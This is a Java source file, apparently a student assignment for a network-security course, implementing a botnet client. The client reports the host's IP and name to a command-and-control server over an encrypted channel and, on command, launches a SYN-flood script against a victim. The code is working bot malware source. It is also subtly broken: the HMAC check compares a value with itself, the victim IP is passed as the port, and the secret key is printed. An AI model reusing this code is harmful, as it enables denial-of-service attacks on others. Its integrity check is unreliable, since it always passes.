/**
 *    Ασφάλεια Δικτύων Υπολογιστών & Τεχνολογίες Προστασίας της Ιδιωτικότητας
 *                                   Άσκηση 2
 * Δημιουργία ασφαλούς διαύλου διαχείρισης botnet (C&C) με αξιοποίηση Tor και 
 * χρήση πρωτοκόλλου διασφάλισης εμπιστευτικότητας και ακεραιότητας
 * 
 *                      Πέππας Κωνσταντίνος 321/2011134
 *                      Σωτηρέλης Χρήστος   321/2012182
 *                      Χαϊκάλης Νικόλαος   321/2012200
 * 
 */

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.Inet4Address;
import java.net.Socket;
import java.net.UnknownHostException;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.crypto.Mac;
import javax.crypto.SecretKey;

public class ChatWithCC implements Serializable{
    private int port; //port epikoinwnias me ton C&C Server
    private String CC_IP; //ip tou C&C Server
    private Socket socket;
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private boolean keepWalking = true;
    private Messages msgs = new Messages();
    private String IP, PCname;
    private Process p1;
    private MySSL myssl = new MySSL();
    private PublicKey pubKey;
    private SecretKey secKey;
    private Mac mac;
    
    /** 
     * @param port
     * @param CC_IP 
     * Diavazw tis @params apo ton admin otan thelei na dwsei
     * diaforetiko port k IP apo ta default.
     */
    public ChatWithCC(int port, String CC_IP) {
        this.port = port;
        this.CC_IP = CC_IP;
    }
    
    /**
     * @param port 
     * otan o admin thelei na dwsei mono diaforetiko port ara 
     * i CC_IP tha parei timi "localhost"
     */
    public ChatWithCC(int port) {
        this.port = port;
        CC_IP = "localhost";
    }

    /**
     * @param CC_IP 
     * Otan o admin thelei na dwsei mono diaforeretiki IP ara to port
     * to afinume default.
     */
    public ChatWithCC(String CC_IP) {
        this.CC_IP = CC_IP;
        port = 4444;
    }
    
    /**
     * Default Constructor gia tis default times tis epikoinwnias mas
     */
    public ChatWithCC(){
        CC_IP = "localhost";
        port = 4444;
    }
    
    /**
     * Methodos pou tin xrisimopoiw gia na edrewsw tin sindesi me ton
     * C&C Server
     */
    public void Start_Connection() throws InterruptedException{
        try {
            socket = new Socket(CC_IP, port);
            oos = new ObjectOutputStream(socket.getOutputStream());
            ois = new ObjectInputStream(socket.getInputStream());
            IP = GetHostAddress(); //Diavazw tin IP tou mixanimatos.
            PCname = GetHostName(); //Daivazw to Name tou Mixanimatos.
            ClientServerHandSHake();
            Chat_Thread.start(); //Ksekinaei to chat me ton C&C.
        } catch (NullPointerException | IOException ex) {
            System.out.println("Server is down or incorrect certificates.");
            Stop_Connection();
        }
    }
    
    private void ClientServerHandSHake(){
        
        try {
            byte[] ca = (byte[]) ois.readObject();//Diavazw ta Bytes tis CA
            pubKey = myssl.VerifyAndGetPubFromCA(ca);//Vriskw to PubKey apo tin CA
            secKey = myssl.CreateSecretKey();//Dimiourgw ena SecKey
            byte[] endcryptedKey = myssl.EncryptSecKeyWithPubKey(secKey, pubKey); //Encrypt SecKey me PubKye;
            oos.writeObject(endcryptedKey);//Stelnw to kriptografimeno SecKey
            System.out.println("SecKey is: " + secKey);
            //Create HMAC:
            mac = Mac.getInstance("HmacSHA256");
            mac.init(secKey);
            System.out.println("handshake complete. HMAC is ready.");
        } catch (IOException | ClassNotFoundException | NoSuchAlgorithmException | InvalidKeyException ex) {
            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    //HMAC Validation & Decrypt ta byte[] pou exume parei apo to server.
    private Object HMacValidationAndDecrypt(byte[] ciphertext){
        
//        System.out.println("HMacValidationAndDecrypt 1" + ciphertext);
        byte[] macBytes = mac.doFinal(ciphertext);
        
        if(MessageDigest.isEqual(macBytes, mac.doFinal(ciphertext))){
//            System.out.println("ciphertext: " + ciphertext);
            Object readObj = myssl.DecryptWithSecKey(ciphertext, secKey);
            //System.out.println("HMacValidationAndDecrypt return: " + readObj.toString());
            return readObj;
        }
        
        System.out.println("HMacValidationAndDecrypt FAILED");
        return null;
    }  

    /**
     * Methodos gia na stamatisw tin sindesi me ton C&C Server.
     */
    public void Stop_Connection(){
        keepWalking = false; //gia na stamatisei to chat alliws to thread dn ginete interrupt gt dn stamataei i liturgeia tou.
        Chat_Thread.interrupt();
        try {
            if(oos != null) oos.close();
            if(ois != null) ois.close();
        } catch (IOException ex) {
            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
        }
        try {
            if(socket !=null) socket.close();
        } catch (IOException ex) {
            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    /**
     * Dimiourgia enos thread pou tha xrisimopoiisw tin class chat
     * prokeimenou na dimiurgisw ena chat metaksi tou Bot kai tou
     * C&C Server.
     */
    private Thread Chat_Thread = new Thread(() -> { 
        Chat chating = new Chat(oos, ois, "C&C Server");
        Bot_Properties bp = new Bot_Properties(IP, PCname);
//        System.out.println("PC: " + bp.getBotPCname());
        byte[] botprop = myssl.EncryptWithSecKey(bp, secKey);
        chating.SendBytes(botprop);
        //chating.SendMessage(msgs.StopConnection());
        while(keepWalking == true){
            byte[] read = chating.ReadBytes();
            //System.out.println("1" + read);
            if(socket.isClosed()){
                System.exit(0);
            }
            if(read != null){
                System.out.println("Encrypt msg: " + read);
                Object readObj = HMacValidationAndDecrypt(read);  
                /**
                 * An to Bot stilei aitima na klisei tin sindesi k o Server tou apantisei
                 * me "STOP_CONNECTION_WITH_THE_BOTMASTER" tote kleinw tin sindesi.
                 */
                System.out.println("Decrypted msg: " + readObj);
                if(readObj.toString().equalsIgnoreCase(msgs.StopConnection())){
                    Stop_Connection();
                }
                else if(readObj.toString().equalsIgnoreCase(msgs.BotSendMeYourInfos())){
                    //bp = new Bot_Properties(IP, PCname);
                   // chating.SendMessage(bp);
                }
                else if(readObj instanceof Attack_Properties){
                    System.out.println("Start Attack");
                    Attack_Properties ap = new Attack_Properties();
                    Attack(ap.getIP_Victim(), ap.getIP_Victim());
                }
                else if(readObj.toString().equalsIgnoreCase(msgs.StopAttack())){
                    StopAttack();
                }
            }
        }
    });

    
    /**
     * Methodos poy kalw meso tis python to SynFlood 
     */
    private void Attack(String ip, String Victim_port){
        try {
            p1 = Runtime.getRuntime().exec("C:\\Users\\Alcohealism\\AppData\\Local\\Programs\\Python\\Python35-32\\python SYNFlood.py" + ip + Victim_port); 
            System.out.println("SynFlood is running !!!");
        } catch (IOException ex) {
            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    private void StopAttack(){
        System.out.println("Retreat my Bots!!!!");
        p1.destroy();
    }
    
    /**
     * Methodos pou kanw return tin local ip tou mixanimatos.
     */
    private String GetHostAddress() throws UnknownHostException{
        return Inet4Address.getLocalHost().getHostAddress();
    }
    
    /**
     * Methodos pou kanw return to name tou mixanimatos.
     */
    private String GetHostName() throws UnknownHostException{
        return Inet4Address.getLocalHost().getHostName();
    }
}